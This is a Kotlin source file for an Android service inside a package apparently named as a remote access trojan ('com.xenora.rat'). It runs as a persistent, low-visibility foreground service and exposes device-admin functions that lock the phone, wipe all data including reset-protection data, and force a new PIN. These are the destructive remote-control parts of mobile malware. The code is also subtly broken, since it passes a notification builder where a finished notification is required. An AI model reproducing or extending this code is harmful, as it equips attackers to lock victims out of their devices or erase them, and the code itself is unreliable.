// android/app/src/main/kotlin/com/xenora/rat/services/AdminService.kt
package com.xenora.rat.services

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.xenora.rat.DeviceAdminReceiver
import com.xenora.rat.MainActivity
import com.xenora.rat.R

class AdminService : Service() {
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName

    companion object {
        const val NOTIFICATION_ID = 1001
        var isRunning = false
    }

    override fun onCreate() {
        super.onCreate()
        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
        isRunning = true
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "admin_service",
                "Xenora Admin Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Device admin service for Xenora X"
                setShowBadge(false)
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): NotificationCompat.Builder {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, "admin_service")
            .setContentTitle("Xenora X")
            .setContentText("Device admin active")
            .setSmallIcon(R.drawable.ic_launcher)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
    }

    fun lockDevice(): Boolean {
        return if (devicePolicyManager.isAdminActive(adminComponent)) {
            devicePolicyManager.lockNow()
            true
        } else {
            false
        }
    }

    fun wipeData(): Boolean {
        return if (devicePolicyManager.isAdminActive(adminComponent)) {
            devicePolicyManager.wipeData(DevicePolicyManager.WIPE_RESET_PROTECTION_DATA)
            true
        } else {
            false
        }
    }

    fun resetPassword(pin: String): Boolean {
        return if (devicePolicyManager.isAdminActive(adminComponent)) {
            devicePolicyManager.resetPassword(pin, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY)
        } else {
            false
        }
    }

    fun isAdminActive(): Boolean {
        return devicePolicyManager.isAdminActive(adminComponent)
    }
}